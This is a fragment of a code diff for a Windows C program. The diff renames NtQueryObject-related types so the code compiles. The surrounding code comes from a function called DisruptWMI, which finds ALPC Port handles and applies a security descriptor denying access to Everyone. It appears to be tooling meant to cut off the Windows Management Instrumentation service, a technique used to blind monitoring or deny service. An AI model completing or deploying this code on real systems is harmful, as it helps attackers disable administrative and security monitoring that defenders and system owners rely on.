@@ -26,22 +26,22 @@ typedef struct _SYSTEM_HANDLE_INFORMATION {
     SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
 } SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
 
-typedef enum _OBJECT_INFORMATION_CLASS {
-    ObjectBasicInformation,
-    ObjectNameInformation,
-    ObjectTypeInformation,
-    ObjectAllInformation,
-    ObjectDataInformation
-} OBJECT_INFORMATION_CLASS;
+typedef enum _MY_OBJECT_INFORMATION_CLASS {
+    MyObjectBasicInformation,
+    MyObjectNameInformation,
+    MyObjectTypeInformation,
+    MyObjectAllInformation,
+    MyObjectDataInformation
+} MY_OBJECT_INFORMATION_CLASS;
 
-typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION {
+typedef struct _MY_PUBLIC_OBJECT_TYPE_INFORMATION {
     UNICODE_STRING TypeName;
     ULONG Reserved[22];
-} PUBLIC_OBJECT_TYPE_INFORMATION, *PPUBLIC_OBJECT_TYPE_INFORMATION;
+} MY_PUBLIC_OBJECT_TYPE_INFORMATION, *PMY_PUBLIC_OBJECT_TYPE_INFORMATION;
 
 typedef NTSTATUS(NTAPI* tNtQueryObject)(
     HANDLE Handle,
-    OBJECT_INFORMATION_CLASS ObjectInformationClass,
+    int ObjectInformationClass,
     PVOID ObjectInformation,
     ULONG ObjectInformationLength,
     PULONG ReturnLength
@@ -87,8 +87,8 @@ bool DisruptWMI() {
                 // Check if it's an ALPC Port
                 char typeBuffer[1024];
                 ULONG typeSize;
-                if (NtQueryObject(hDuplicated, ObjectTypeInformation, typeBuffer, sizeof(typeBuffer), &typeSize) >= 0) {
-                    PPUBLIC_OBJECT_TYPE_INFORMATION typeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeBuffer;
+                if (NtQueryObject(hDuplicated, 2 /* ObjectTypeInformation */, typeBuffer, sizeof(typeBuffer), &typeSize) >= 0) {
+                    MY_PUBLIC_OBJECT_TYPE_INFORMATION* typeInfo = (MY_PUBLIC_OBJECT_TYPE_INFORMATION*)typeBuffer;
                     if (typeInfo->TypeName.Buffer && wcsstr(typeInfo->TypeName.Buffer, L"ALPC Port")) {
                         PSECURITY_DESCRIPTOR pSD = NULL;
                         // D:(D;;GA;;;WD) -> Deny all access to Everyone
